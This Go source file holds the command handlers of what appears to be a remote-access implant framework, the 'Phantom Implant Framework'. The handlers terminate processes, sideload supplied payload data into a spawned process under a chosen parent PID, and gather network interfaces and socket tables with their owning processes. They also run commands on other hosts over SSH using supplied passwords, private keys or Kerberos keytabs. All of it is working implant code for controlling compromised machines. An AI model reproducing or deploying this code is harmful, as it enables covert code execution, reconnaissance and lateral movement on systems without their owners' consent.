//go:build linux || darwin || windows

package handlers

/*
	Phantom Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"net"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/cryptdefender3232/phantom/implant/phantom/netstat"
	"github.com/cryptdefender3232/phantom/implant/phantom/ps"
	"github.com/cryptdefender3232/phantom/implant/phantom/shell/ssh"
	"github.com/cryptdefender3232/phantom/implant/phantom/taskrunner"
	"github.com/cryptdefender3232/phantom/protobuf/commonpb"
	"github.com/cryptdefender3232/phantom/protobuf/phantompb"

	"google.golang.org/protobuf/proto"
)

// ------------------------------------------------------------------------------------------
// These are generic handlers (as in calling convention) that use platform specific code
// ------------------------------------------------------------------------------------------
func terminateHandler(data []byte, resp RPCResponse) {

	terminateReq := &phantompb.TerminateReq{}
	err := proto.Unmarshal(data, terminateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	var errStr string
	if int(terminateReq.Pid) <= 1 && !terminateReq.Force {
		errStr = "Cowardly refusing to terminate process without force"
	} else {
		err = ps.Kill(int(terminateReq.Pid))
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Failed to kill process %s", err)
			// {{end}}
			errStr = err.Error()
		}
	}

	data, err = proto.Marshal(&phantompb.Terminate{
		Pid: terminateReq.Pid,
		Response: &commonpb.Response{
			Err: errStr,
		},
	})
	resp(data, err)
}

func sideloadHandler(data []byte, resp RPCResponse) {
	sideloadReq := &phantompb.SideloadReq{}
	err := proto.Unmarshal(data, sideloadReq)
	if err != nil {
		return
	}
	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetProcessArgs(), sideloadReq.GetPPid(), sideloadReq.GetData(), sideloadReq.GetArgs(), sideloadReq.Kill)
	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	sideloadResp := &phantompb.Sideload{
		Result: result,
		Response: &commonpb.Response{
			Err: errStr,
		},
	}
	data, err = proto.Marshal(sideloadResp)
	resp(data, err)
}

func ifconfigHandler(_ []byte, resp RPCResponse) {
	interfaces := ifconfig()
	// {{if .Config.Debug}}
	log.Printf("network interfaces: %#v", interfaces)
	// {{end}}
	data, err := proto.Marshal(interfaces)
	resp(data, err)
}

func ifconfig() *phantompb.Ifconfig {
	netInterfaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	interfaces := &phantompb.Ifconfig{
		NetInterfaces: []*phantompb.NetInterface{},
	}
	for _, iface := range netInterfaces {
		netIface := &phantompb.NetInterface{
			Index: int32(iface.Index),
			Name:  iface.Name,
		}
		if iface.HardwareAddr != nil {
			netIface.MAC = iface.HardwareAddr.String()
		}
		addresses, err := iface.Addrs()
		if err == nil {
			for _, address := range addresses {
				netIface.IPAddresses = append(netIface.IPAddresses, address.String())
			}
		}
		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
	}
	return interfaces
}

func netstatHandler(data []byte, resp RPCResponse) {
	netstatReq := &phantompb.NetstatReq{}
	err := proto.Unmarshal(data, netstatReq)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		//{{end}}
		return
	}

	result := &phantompb.Netstat{}
	entries := make([]*phantompb.SockTabEntry, 0)

	if netstatReq.UDP {
		if netstatReq.IP4 {
			tabs, err := netstat.UDPSocks(netstat.NoopFilter)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("udp", tabs)...)
		}
		if netstatReq.IP6 {
			tabs, err := netstat.UDP6Socks(netstat.NoopFilter)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("udp6", tabs)...)
		}
	}

	if netstatReq.TCP {
		var fn netstat.AcceptFn
		switch {
		case netstatReq.Listening:
			fn = func(s *netstat.SockTabEntry) bool {
				return s.State == netstat.Listen
			}
		default:
			fn = func(s *netstat.SockTabEntry) bool {
				return s.State != netstat.Listen
			}
		}

		if netstatReq.IP4 {
			tabs, err := netstat.TCPSocks(fn)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("tcp", tabs)...)
		}

		if netstatReq.IP6 {
			tabs, err := netstat.TCP6Socks(fn)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("tcp6", tabs)...)
		}
		result.Entries = entries
		data, err := proto.Marshal(result)
		resp(data, err)
	}
}

func buildEntries(proto string, s []netstat.SockTabEntry) []*phantompb.SockTabEntry {
	entries := make([]*phantompb.SockTabEntry, 0)
	for _, e := range s {
		var (
			pid  int32
			exec string
		)
		if e.Process != nil {
			pid = int32(e.Process.Pid)
			exec = e.Process.Name
		}
		entries = append(entries, &phantompb.SockTabEntry{
			LocalAddr: &phantompb.SockTabEntry_SockAddr{
				Ip:   e.LocalAddr.IP.String(),
				Port: uint32(e.LocalAddr.Port),
			},
			RemoteAddr: &phantompb.SockTabEntry_SockAddr{
				Ip:   e.RemoteAddr.IP.String(),
				Port: uint32(e.RemoteAddr.Port),
			},
			SkState: e.State.String(),
			UID:     e.UID,
			Process: &commonpb.Process{
				Pid:        pid,
				Executable: exec,
			},
			Protocol: proto,
		})
	}
	return entries

}

func runSSHCommandHandler(data []byte, resp RPCResponse) {
	commandReq := &phantompb.SSHCommandReq{}
	err := proto.Unmarshal(data, commandReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %s\n", err.Error())
		// {{end}}
		return
	}
	stdout, stderr, err := ssh.RunSSHCommand(commandReq.Hostname,
		uint16(commandReq.Port),
		commandReq.Username,
		commandReq.Password,
		commandReq.PrivKey,
		commandReq.Krb5Conf,
		commandReq.Keytab,
		commandReq.Realm,
		commandReq.Command,
	)
	commandResp := &phantompb.SSHCommand{
		Response: &commonpb.Response{},
		StdOut:   stdout,
		StdErr:   stderr,
	}
	if err != nil {
		commandResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(commandResp)
	resp(data, err)
}
